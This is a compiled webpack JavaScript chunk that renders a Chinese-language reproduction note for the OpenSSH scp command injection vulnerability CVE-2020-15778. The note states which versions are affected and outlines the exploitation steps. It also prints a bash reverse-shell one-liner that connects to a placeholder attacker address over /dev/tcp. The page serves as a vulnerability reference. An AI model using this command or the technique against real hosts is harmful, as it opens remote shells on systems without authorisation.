(window.webpackJsonp=window.webpackJsonp||[]).push([[424],{1887:function(s,t,a){s.exports=a.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220311162457049.fdb4f724.png"},1888:function(s,t,a){s.exports=a.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-6987082.1b408445.png"},3109:function(s,t,a){"use strict";a.r(t);var e=a(64),r=Object(e.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"openssh-命令注入漏洞-cve-2020-15778"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#openssh-命令注入漏洞-cve-2020-15778"}},[s._v("#")]),s._v(" OpenSSH 命令注入漏洞 CVE-2020-15778")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。深信服安全研究团队依据漏洞重要性和影响力进行评估，作出漏洞通告。")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("OpenSSH <= 8.3p1")]),t("br"),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("a-alert",{attrs:{type:"success",message:"可用于目标不允许远程登录但SCP开启的情况下远程命令执行",description:"",showIcon:""}}),s._v(" "),t("br"),s._v(" "),t("p",[s._v("攻击机创建 peiqi.txt ，利用 scp上传文件 到 /tmp 目录下")]),s._v(" "),t("p",[t("img",{attrs:{src:a(1887),alt:"img"}})]),s._v(" "),t("p",[s._v("执行命令 ping dnslog")]),s._v(" "),t("p",[t("img",{attrs:{src:a(1888),alt:"img"}})]),s._v(" "),t("p",[s._v("反弹shell 更换命令即可")]),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("/bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])])],1)}),[],!1,null,null,null);t.default=r.exports}}]);